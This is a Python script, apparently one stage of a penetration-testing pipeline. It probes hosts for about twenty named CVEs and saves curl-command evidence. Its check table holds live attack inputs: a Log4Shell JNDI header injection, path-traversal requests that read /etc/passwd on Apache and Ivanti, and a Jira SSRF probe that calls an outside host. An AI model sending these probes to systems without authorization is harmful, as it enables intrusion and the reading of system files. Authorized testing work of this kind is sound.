#!/usr/bin/env python3
"""Phase 5 helper: Safe validation of exploitability — non-destructive checks only."""
import argparse
import json
import subprocess
import re
import sys
import os
import time
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
from concurrent.futures import ThreadPoolExecutor, as_completed

# Safe validation checks per technology/CVE type
# These NEVER execute destructive payloads — they only confirm the attack surface exists

SAFE_CHECKS = {
    # Web server version confirmation
    'version_header': {
        'description': 'Confirm version via HTTP response headers',
        'method': 'header_check',
    },
    # Path-based checks (just GET requests)
    'path_exists': {
        'description': 'Confirm vulnerable endpoint exists',
        'method': 'path_check',
    },
    # Nuclei re-validation
    'nuclei_recheck': {
        'description': 'Re-run specific nuclei template for confirmation',
        'method': 'nuclei_check',
    },
}

# CVE-specific safe checks: maps CVE patterns to validation functions
CVE_SAFE_CHECKS = {
    # Citrix Bleed
    'CVE-2023-4966': {
        'paths': ['/vpn/index.html', '/logon/LogonPoint/index.html'],
        'header_check': 'Server',
        'description': 'Check Citrix Gateway/ADC login page accessible',
    },
    # Citrix RCE
    'CVE-2023-3519': {
        'paths': ['/vpn/index.html'],
        'header_check': 'Server',
        'description': 'Check Citrix ADC NSIP accessible',
    },
    # Apache Struts RCE
    'CVE-2017-5638': {
        'paths': ['/', '/index.action', '/login.action'],
        'header_check': 'Content-Type',
        'description': 'Check for Struts content-type handling',
    },
    # Log4Shell
    'CVE-2021-44228': {
        'paths': ['/'],
        'header_inject': {'X-Api-Version': '${jndi:dns://CANARY}'},
        'description': 'Check for Log4j via header reflection (DNS only)',
    },
    # Spring4Shell
    'CVE-2022-22965': {
        'paths': ['/'],
        'header_check': 'X-Application-Context',
        'description': 'Check for Spring Framework markers',
    },
    # Confluence RCE
    'CVE-2023-22515': {
        'paths': ['/server-info.action', '/setup/setupadministrator.action'],
        'status_check': [200, 302],
        'description': 'Check Confluence admin setup endpoint accessible',
    },
    'CVE-2023-22527': {
        'paths': ['/template/aui/text-inline.vm'],
        'status_check': [200],
        'description': 'Check Confluence template injection endpoint',
    },
    # Jira
    'CVE-2019-8449': {
        'paths': ['/rest/api/2/user/picker?query=admin'],
        'status_check': [200],
        'description': 'Check Jira user enumeration endpoint',
    },
    'CVE-2019-8451': {
        'paths': ['/plugins/servlet/gadgets/makeRequest?url=https://ifconfig.me'],
        'status_check': [200],
        'description': 'Check Jira SSRF endpoint',
    },
    # Jenkins
    'CVE-2024-23897': {
        'paths': ['/cli', '/cli/'],
        'status_check': [200],
        'description': 'Check Jenkins CLI endpoint accessible',
    },
    # GitLab
    'CVE-2023-7028': {
        'paths': ['/users/password/new', '/api/v4/version'],
        'status_check': [200],
        'description': 'Check GitLab password reset accessible',
    },
    # MOVEit
    'CVE-2023-34362': {
        'paths': ['/human.aspx', '/guestaccess.aspx'],
        'status_check': [200, 302],
        'description': 'Check MOVEit Transfer login accessible',
    },
    # F5 BIG-IP
    'CVE-2023-46747': {
        'paths': ['/tmui/login.jsp'],
        'status_check': [200],
        'description': 'Check F5 TMUI login accessible',
    },
    # Telerik UI
    'CVE-2019-18935': {
        'paths': ['/Telerik.Web.UI.WebResource.axd?type=rau'],
        'status_check': [200],
        'description': 'Check Telerik RadAsyncUpload handler',
    },
    # Apache HTTP Server path traversal
    'CVE-2021-41773': {
        'paths': ['/icons/.%2e/%2e%2e/%2e%2e/etc/passwd'],
        'content_check': 'root:',
        'description': 'Check Apache path traversal (read-only)',
    },
    'CVE-2021-42013': {
        'paths': ['/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'],
        'content_check': 'root:',
        'description': 'Check Apache double-encoding path traversal',
    },
    # WordPress
    'CVE-2024-27956': {
        'paths': ['/wp-admin/admin-ajax.php'],
        'status_check': [200, 400],
        'description': 'Check WordPress AJAX handler accessible',
    },
    # Ivanti Connect Secure
    'CVE-2024-21887': {
        'paths': ['/api/v1/totp/user-backup-code/../../system/system-information'],
        'status_check': [200],
        'description': 'Check Ivanti path traversal',
    },
    # FortiOS
    'CVE-2024-21762': {
        'paths': ['/remote/logincheck'],
        'status_check': [200, 401],
        'description': 'Check FortiGate SSL VPN login',
    },
    # Generic checks
    'generic_rce': {
        'paths': ['/'],
        'description': 'Version-based RCE surface check',
    },
}


def safe_curl(url, method='GET', headers=None, timeout=10, follow=True):
    """Make a safe HTTP request and return response data."""
    try:
        req = Request(url, method=method)
        req.add_header('User-Agent', 'Mozilla/5.0 (compatible; security-research)')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        resp = urlopen(req, timeout=timeout)
        body = resp.read().decode('utf-8', errors='replace')[:10000]
        resp_headers = dict(resp.headers)
        return {
            'status': resp.status,
            'headers': resp_headers,
            'body_preview': body[:2000],
            'body_size': len(body),
            'url': resp.url,
        }
    except HTTPError as e:
        body = ''
        try:
            body = e.read().decode('utf-8', errors='replace')[:2000]
        except Exception:
            pass
        return {
            'status': e.code,
            'headers': dict(e.headers) if hasattr(e, 'headers') else {},
            'body_preview': body,
            'error': str(e),
        }
    except Exception as e:
        return {'status': 0, 'error': str(e)[:200]}


def validate_cve(entry):
    """Run safe validation checks for a CVE against its hosts."""
    cve_id = entry.get('cve_id', '')
    hosts = entry.get('hosts', [])
    tech = entry.get('technology', '')
    version = entry.get('detected_version', '')

    results = {
        'validated': False,
        'checks_run': [],
        'evidence': [],
        'validation_notes': [],
    }

    if not hosts:
        results['validation_notes'].append('No hosts to validate')
        return results

    # Get CVE-specific checks
    cve_checks = CVE_SAFE_CHECKS.get(cve_id, CVE_SAFE_CHECKS.get('generic_rce', {}))
    paths = cve_checks.get('paths', ['/'])
    status_check = cve_checks.get('status_check')
    content_check = cve_checks.get('content_check')
    header_check = cve_checks.get('header_check')
    header_inject = cve_checks.get('header_inject')

    for host in hosts[:3]:  # Check up to 3 hosts
        # Normalize host to URL
        if not host.startswith('http'):
            host = f"https://{host}"
        host = host.rstrip('/')

        for path in paths:
            url = f"{host}{path}"
            check_result = {
                'url': url,
                'cve': cve_id,
                'check_type': cve_checks.get('description', 'generic'),
            }

            resp = safe_curl(url, headers=header_inject)
            check_result['response'] = {
                'status': resp.get('status', 0),
                'server': resp.get('headers', {}).get('Server', ''),
                'body_size': resp.get('body_size', 0),
            }

            validated = False

            # Status code check
            if status_check and resp.get('status') in status_check:
                validated = True
                check_result['match'] = f"Status {resp['status']} matches expected {status_check}"

            # Content check
            if content_check and content_check in resp.get('body_preview', ''):
                validated = True
                check_result['match'] = f"Content match: '{content_check}' found in response"
                # Capture the matching context
                body = resp.get('body_preview', '')
                idx = body.find(content_check)
                if idx >= 0:
                    check_result['content_context'] = body[max(0, idx-100):idx+200]

            # Header check — confirm technology version
            if header_check:
                header_val = resp.get('headers', {}).get(header_check, '')
                if header_val:
                    check_result['header_found'] = f"{header_check}: {header_val}"
                    # Check if detected version matches
                    if version and version in header_val:
                        validated = True
                        check_result['match'] = f"Version {version} confirmed in {header_check} header"

            # Version in any header
            if version and not validated:
                for hdr_name, hdr_val in resp.get('headers', {}).items():
                    if version in str(hdr_val):
                        validated = True
                        check_result['match'] = f"Version {version} found in {hdr_name}: {hdr_val}"
                        break

            # Server header version match
            server = resp.get('headers', {}).get('Server', '')
            if server and version and version in server:
                validated = True
                check_result['match'] = f"Version confirmed in Server header: {server}"

            check_result['validated'] = validated
            results['checks_run'].append(check_result)

            if validated:
                results['validated'] = True
                # Save curl command for evidence
                curl_cmd = f"curl -sk -D- '{url}'"
                if header_inject:
                    for k, v in header_inject.items():
                        curl_cmd += f" -H '{k}: {v}'"
                results['evidence'].append({
                    'type': 'http_response',
                    'url': url,
                    'curl_command': curl_cmd,
                    'status': resp.get('status'),
                    'headers': resp.get('headers', {}),
                    'body_preview': resp.get('body_preview', '')[:1000],
                })

    # Also check if nuclei confirmed it
    classification = entry.get('classification', {})
    if classification.get('has_nuclei_template'):
        results['validation_notes'].append('Nuclei template available for re-validation')
    if 'CONFIRMED_BY_LIVE_SCAN' in str(entry.get('exploits', [])):
        results['validated'] = True
        results['validation_notes'].append('CONFIRMED by nuclei live scan')

    return results


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--exploit-map', required=True, help='Exploit map JSON from Phase 4')
    parser.add_argument('--output', required=True, help='Output validated CVEs JSON')
    parser.add_argument('--curl-output', default='', help='Directory to save curl evidence')
    parser.add_argument('--threads', type=int, default=5, help='Parallel validation threads')
    args = parser.parse_args()

    exploit_path = Path(args.exploit_map)
    if not exploit_path.exists():
        print("Exploit map not found")
        with open(args.output, 'w') as f:
            json.dump([], f)
        return

    with open(exploit_path) as f:
        exploit_map = json.load(f)

    if args.curl_output:
        Path(args.curl_output).mkdir(parents=True, exist_ok=True)

    print(f"Validating {len(exploit_map)} CVEs...")

    # Only validate CVEs that have some exploit potential
    to_validate = [
        e for e in exploit_map
        if e.get('classification', {}).get('readiness') != 'no_public_exploit'
        or e.get('cvss_score', 0) >= 9.0
        or e.get('in_kev')
    ]
    print(f"Prioritized {len(to_validate)} CVEs for validation (have exploits, high CVSS, or KEV)")

    validated_results = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_map = {}
        for entry in to_validate:
            future = executor.submit(validate_cve, entry)
            future_map[future] = entry

        for future in as_completed(future_map):
            entry = future_map[future]
            cve_id = entry['cve_id']
            try:
                validation = future.result()
                entry['validation'] = validation

                status = "VALIDATED" if validation['validated'] else "unconfirmed"
                print(f"  {cve_id}: {status}")

                # Save curl evidence
                if args.curl_output and validation['evidence']:
                    evidence_file = Path(args.curl_output) / f"{cve_id}_evidence.json"
                    with open(evidence_file, 'w') as f:
                        json.dump(validation['evidence'], f, indent=2)

            except Exception as e:
                entry['validation'] = {
                    'validated': False,
                    'error': str(e)[:200],
                }
                print(f"  {cve_id}: error — {e}")

            validated_results.append(entry)

    # Also include non-validated high-value CVEs for manual review
    validated_ids = {e['cve_id'] for e in validated_results}
    for entry in exploit_map:
        if entry['cve_id'] not in validated_ids:
            entry['validation'] = {
                'validated': False,
                'checks_run': [],
                'validation_notes': ['Skipped — no public exploit and CVSS < 9.0'],
            }
            validated_results.append(entry)

    # Sort: validated first, then by CVSS
    validated_results.sort(key=lambda x: (
        0 if x.get('validation', {}).get('validated') else 1,
        0 if x.get('in_kev') else 1,
        -x.get('cvss_score', 0),
    ))

    with open(args.output, 'w') as f:
        json.dump(validated_results, f, indent=2)

    confirmed = sum(1 for v in validated_results if v.get('validation', {}).get('validated'))
    print(f"\nValidation complete: {confirmed} confirmed exploitable out of {len(validated_results)}")


if __name__ == '__main__':
    main()
